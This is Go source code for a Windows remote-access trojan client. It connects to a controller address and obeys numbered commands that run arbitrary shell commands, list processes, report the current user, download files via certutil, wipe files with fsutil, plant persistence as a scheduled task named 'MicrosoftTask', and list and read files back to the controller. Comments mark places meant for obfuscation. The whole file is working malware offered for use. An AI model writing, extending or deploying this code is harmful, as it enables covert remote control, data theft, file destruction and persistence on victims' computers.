package main
import("fmt") // needed for sending packets
import("bufio") // needed for recieving packets
import("net") // needed to make connection
import("time") // needed to stop the client/payload from being a cpu hog
import("os") // needed for opening files
import("os/exec") // needed for executing commands
import("strings") // needed for replacing strings 
import("io/ioutil") // needed for listing files
import("strconv") // needed for converting bool to string
import("runtime") // needed for finding current file name for presistence
import("os/user") // needed for finding currenct user
func main () {
	
	for {
		time.Sleep(time.Second)
		for {
			// note to self: add obfuscation
			connection, errer := net.Dial("tcp", "127.0.0.1:80") // obf
			if (errer != nil) {
				break
			}
			for {
				
				data, errer := bufio.NewReader(connection).ReadString('\n')
				if (errer != nil) {
					break
				}
				for {
					if (data == "a" || data[0] == 97) {
						data,_ := bufio.NewReader(connection).ReadString('\n')
						h := "/c " + string(data)
						args:= strings.Split(string(h)," ")
						k := exec.Command("cmd.exe",args...)
						ktwo,_ := k.Output()
						file1 := strings.Replace(string(ktwo), "\n", "COMMANDSAREFUN", -1)
						fmt.Fprintf(connection, string(file1) + "\n")
					}
					if (data == "9" || data[0] == 57) {
						k := exec.Command("tasklist.exe") // obf
						ktwo,_ := k.Output()
						file1 := strings.Replace(string(ktwo), "\n", "74211553", -1)
						fmt.Fprintf(connection, string(file1) + "\n")
					}
					if (data == "8" || data[0] == 56) {
						user,_ := user.Current()
						username := user.Username
						fmt.Fprintf(connection, username + "\n")
					}
					if (data == "7" || data[0] == 55) {
						url,_ := bufio.NewReader(connection).ReadString('\n')
						filename,_ := bufio.NewReader(connection).ReadString('\n')
						k := exec.Command("cmd.exe","/c","certutil.exe","-urlcache","-split","-f",string(url),string(filename)) // obf
						ktwo,_ := k.Output()
						fmt.Fprintf(connection, string(ktwo) + "\n")
						
					}
					if (data == "6" || data[0] == 54) { // option 6 aka file deletion
						filename,_ := bufio.NewReader(connection).ReadString('\n')
						k := exec.Command("cmd.exe","/c","fsutil.exe","file","setZeroData","offset=0","length=9999999999",filename) // obf
						ktwo,_ := k.Output()
						fmt.Fprintf(connection, string(ktwo) + "\n")
					}
					if (data == "5" || data[0] == 53) { // option 5 aka maintain access via schtasks
						_, filename, _, _ := runtime.Caller(1)
						k := exec.Command("cmd.exe","/c","schtasks","/create","/tn","MicrosoftTask","/tr",filename,"/sc","daily") // obf
						ktwo,_ := k.Output()
						fmt.Fprintf(connection, string(ktwo) + "\n")
					}
					if (data == "3" || data[0] == 51) { // option 3 aka exit
						return
					}
					if (data == "4" || data[0] == 52) { // option 4 aka file list
						file3, errer := bufio.NewReader(connection).ReadString('\n')
						if (errer != nil) {
							break
						}
						file3 = strings.Replace(file3, "\n", "", -1)
						files, err := ioutil.ReadDir(file3)
						if (err != nil) {
							fmt.Fprintf(connection, "ERROR\n") // obf
						}
						for _, file := range files {
							fmt.Fprintf(connection, "File name: '") // obf
							fmt.Fprintf(connection, file.Name())
							h := file.IsDir()
							fmt.Fprintf(connection, "' Is dir: ") // obf?
							fmt.Fprintf(connection, strconv.FormatBool(h))
							fmt.Fprintf(connection, " | ")
						}
						fmt.Fprintf(connection, "\n")
						fmt.Fprintf(connection, "EOF\n")

					}
					if (data == "1" || data[0] == 49) { // option 1 aka file read
						file1, errer := bufio.NewReader(connection).ReadString('\n')
						file1 = strings.Replace(file1, "\n", "", -1)
						if (errer != nil) {
							break
						}
						file, errer := os.Open(file1)
						if (errer != nil) {
							fmt.Fprintf(connection, "ERROR\n")
							break
						}
						
						defer file.Close()
						scanner := bufio.NewScanner(file)
						for scanner.Scan() {
							fmt.Fprintf(connection, scanner.Text() + "ඞ")
						}
						fmt.Fprintf(connection, "\n")
						
						break
					}
					data = "0"
					break
				}
			}
		}
	}
}
